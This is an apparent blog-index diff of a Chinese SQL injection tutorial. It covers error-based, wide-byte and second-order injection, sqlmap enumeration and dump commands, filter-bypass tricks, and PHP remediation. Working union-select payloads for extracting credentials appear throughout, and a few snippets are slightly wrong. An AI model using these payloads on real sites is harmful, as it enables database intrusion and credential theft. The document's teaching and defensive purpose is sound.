+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过http://ip/index.php?id=1 and updatexml(1,concat(0x7e,(database())),0) #</span><br><span class="line">可以通过updatexml报错获取到当前的数据库为security</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><p>extractvalue函数可以对XML文档进行查询，extractvalue报错注入与updatexml报错注入的原理一样，也是利用了函数中第二个参数XPath_string，XPath_string正常的格式是xml路径，格式是&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;，如果格式不正确就会报错，extractvalue注入就是利用了XPath_string 的报错进行注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过http://ip/index.php?id=1 and extractvalue(1,concat(0x7e,(database())),0) #</span><br><span class="line">可以通过updatexml报错获取到当前的数据库为security</span><br></pre></td></tr></table></figure>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>​      宽字节注入漏洞产生的原因：开发者为了防止出现SQL注入攻击，将用户输入的数据用addslashes等函数进行过滤。addslashes等函数会默认将单引号等字符进行转义，这样就可以避免注入。宽字节注入产生的原因是MySQL在使用GBK编码的时候，如果第一个字符的ASCII码大于128时，会认为两个字符是一个汉字，会将后面的转义字符“\”吃掉，拼接为汉字，这样就可以将SQL语句闭合，造成宽字节注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）查看数据库的名称</span><br><span class="line">http://ip/index.php?id=1%81&#x27; and 1=2 union select 1,database(),3 %23</span><br><span class="line">（2）查看所有的表信息</span><br><span class="line">http://ip/index.php?id=1%81&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x6374667377696b69%23</span><br><span class="line">（3）查看user表的列信息</span><br><span class="line">http://ip/index.php?id=1%81&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x6374667377696b69 and table_name=0x75736572 %23</span><br><span class="line">（4）查看列的值</span><br><span class="line">http://ip/index.php?id=1%81&#x27;  and 1=2 union select 1,group_concat(username, 0x2a2a2a, password),3 from user %23</span><br></pre></td></tr></table></figure>
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入漏洞是SQL注入的一种形式，是在Web应用程序中经常出现的Web类型漏洞。<br>二次注入的原理：第一次在参数中输入恶意数据插入的时候，由于存在addslashes等函数的过滤，会将特殊字符添加”&quot;进行转义，但是转义字符”&quot;并不会存入到数据库中，这样下一次进行查询时，如果没有过滤，直接从数据库中取出恶意数据并执行，就造成了SQL注入。</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155851282.png" alt="image-20230821155851282"></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155858214.png" alt="image-20230821155858214"></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155902143.png" alt="image-20230821155902143"></p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>SQLMAP是一个自动化的SQL注入工具，其主要功能是发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQLServer, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。</p>
+<p>SQLMAP支持五种不同的注入模式：</p>
+<ol>
+<li>基于布尔的盲注。</li>
+<li>基于时间的盲注。</li>
+<li>基于报错注入。</li>
+<li>联合查询注入。</li>
+<li>堆查询注入。</li>
+</ol>
+<p>SQLMAP的支持7种显示等级，默认为1等级</p>
+<p>等级0：只显示python错误以及严重的信息。<br>等级1：同时显示基本信息和警告信息。（默认）<br>等级2：同时显示debug信息。<br>等级3：同时显示注入的payload。<br>等级4：同时显示HTTP请求。<br>等级5：同时显示HTTP响应头。<br>等级6：同时显示HTTP响应页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）-u或者--url 指定注入目标URL</span><br><span class="line">sqlmap -u http://ip/index.php?id=1</span><br><span class="line">（2）--dbms 指定数据库</span><br><span class="line">sqlmap -u http://ip/index. php?id=1 --dbms=mysql</span><br><span class="line">（3）--os 指定系统</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --os=Windows</span><br><span class="line">（4）--flush-session 刷新缓存</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --flush-session</span><br><span class="line">（5）--proxy 指定代理</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --proxy http://ip:port</span><br><span class="line">（6）--user-agent 指定useragent信息</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --user-agent=&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;</span><br><span class="line">（7）--data 数据以POST方式提交</span><br><span class="line">sqlmap -u http://ip/index.php --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）列出所有的数据库</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --dbs   </span><br><span class="line">（2）列出当前数据库</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --current-db   </span><br><span class="line">（3）列出DBname数据库所有的表</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 -D &#x27;DBname&#x27;  --tables   </span><br><span class="line">（4）列出DBname数据库table表中的所有列</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 -D &#x27;DBname&#x27;  -T &#x27;table&#x27; --columns   </span><br><span class="line">（5）获取DBname数据库table表中column1,column2列中的数据</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 -D &#x27;DBname&#x27;  -T &#x27;table&#x27; -C &#x27;column1,column2&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>应用程序的过滤规则，会将空格设置为黑名单，但是空格存在多种绕过方式，常见的包括 &#x2F;**&#x2F;、tab键、%0a、&#96;来代替空格进行绕过。</p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>MySQL会执行放在 &#x2F;! … &#x2F;中里面语句，&#x2F;!50010 … &#x2F;也可以执行里面的SQL语句，其中5.00.10 为MySQL版本号，当MySQL数据库的实际版本大于内联注释中的版本就会执行里面的代码，可以利用MySQL的这个特性绕过特殊字符过滤。</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>应用程序的过滤规则，通常会针对恶意关键词设置黑名单，如果存在恶意关键词就会退出，但是可能存在过滤不完整或者是只过滤小写或者大写的情况，没有针对大小写组合进行过滤，导致可以通过大小写混写payload的方式来绕过过滤。</p>
+<h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>应用程序的过滤规则，通常会针对恶意关键词设置黑名单，如果存在恶意关键词就会替换为空字符，但是没有多次匹配判断，就可以通过双写字符串的方式来绕过过滤。</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="双重url编码绕过"><a href="#双重url编码绕过" class="headerlink" title="双重url编码绕过"></a>双重url编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160303100.png" alt="image-20230821160303100"></p>
+<h4 id="16进制编码绕过"><a href="#16进制编码绕过" class="headerlink" title="16进制编码绕过"></a>16进制编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160316310.png" alt="image-20230821160316310"></p>
+<h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160329198.png" alt="image-20230821160329198"></p>
+<h4 id="ASCII编码绕过"><a href="#ASCII编码绕过" class="headerlink" title="ASCII编码绕过"></a>ASCII编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160337095.png" alt="image-20230821160337095"></p>
+<h3 id="等价函数字符替换绕过"><a href="#等价函数字符替换绕过" class="headerlink" title="等价函数字符替换绕过"></a>等价函数字符替换绕过</h3><p>​      Mysql查询：Union distinct、updatexml、Extractvalue、floor<br>​      字符串截取函数：mid、substr、substring、left、reverse<br>​      字符串连接函数：concat、group_concat、concat_ws<br>​      字符串转换：char、hex、unhex<br>​      替换逗号：limit 1 offset 0，mid(version() from 1 for 1)<br>​      替换等号：like、in</p>
+<h2 id="MySQL注入漏洞修复"><a href="#MySQL注入漏洞修复" class="headerlink" title="MySQL注入漏洞修复"></a>MySQL注入漏洞修复</h2><h3 id="代码层修复"><a href="#代码层修复" class="headerlink" title="代码层修复"></a>代码层修复</h3><p>数字型注入可以用intval函数进行强制数据转换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id =intval($id);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+
+<p>字符型注入可以用htmlspecialchars函数、MySQL_real_escape_string函数和addslashes函数，进行特殊字符转换防止注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id =htmlspecialchars(addslashes($id));</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+
+<p>参数化查询防止注入。mysqli 和 PDO 这两个新扩展都支持参数化查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$mysqli = new mysqli(&quot;localhost&quot;, &quot;dbusername&quot;, &quot;dbpassword&quot;, &quot;database&quot;);</span><br><span class="line">$username = &quot;somename&quot;;</span><br><span class="line">$password = &quot;someword&quot;;</span><br><span class="line">$query = &quot;SELECT filename, filesize FROM users WHERE (name = ?) and (password = ?)&quot;;</span><br><span class="line">$stmt = $mysqli-&gt;stmt_init();</span><br><span class="line">if ($stmt-&gt;prepare($query)) &#123;</span><br><span class="line">    $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;bind_result($filename, $filesize);</span><br><span class="line">    while ($stmt-&gt;fetch()) &#123;</span><br><span class="line">        printf (&quot;%s : %d\n&quot;, $filename, $filesize);</span><br><span class="line">    &#125;</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pdo = new PDO(&quot;mysql:host=localhost;dbname=database&quot;, &quot;dbusername&quot;,&quot;dbpassword&quot;);</span><br><span class="line">$username = &quot;somename&quot;;</span><br><span class="line">$password = &quot;someword&quot;;</span><br><span class="line">$query = &quot;SELECT * FROM users WHERE (name = :username) and (password = :password)&quot;;</span><br><span class="line">$statement = $pdo-&gt;prepare($query, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));</span><br><span class="line">$statement-&gt;bindParam(&quot;:username&quot;, $username, PDO::PARAM_STR, 10);</span><br><span class="line">$statement-&gt;bindParam(&quot;:password&quot;, $password, PDO::PARAM_STR, 12);</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line">while ($row = $statement-&gt;fetch(PDO::FETCH_ASSOC)) &#123;</span><br><span class="line">  printf (&quot;%s : %d\n&quot;, $row[&quot;filename&quot;], $row[&quot;filesize&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">$statement-&gt;closeCursor();</span><br><span class="line">$pdo = null;</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务器配置修复"><a href="#服务器配置修复" class="headerlink" title="服务器配置修复"></a>服务器配置修复</h3><p>（1） magic_quotes_gpc配置<br>当 magic_quotess_gpc为on，所有的’(单引号)、”(双引号)、\（反斜杠）和NULL’s被一个反斜杠自动转义。该设置将自动影响$_GET 、 $_POST 、$_COOKIE数组的值，在PHP 4，$_ENV也会被转义。<br>注意：本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>（2） magic_quotes_sybase配置<br>magic_quotes_sybase会将单引号（’），转义为两个单引号（’’），但是只将magic_quotes_sybase设置为on并不生效，需要将magic_quotes_gpc也设置为on，magic_quotes_sybase才会生效。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Wed安全</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
 </search>
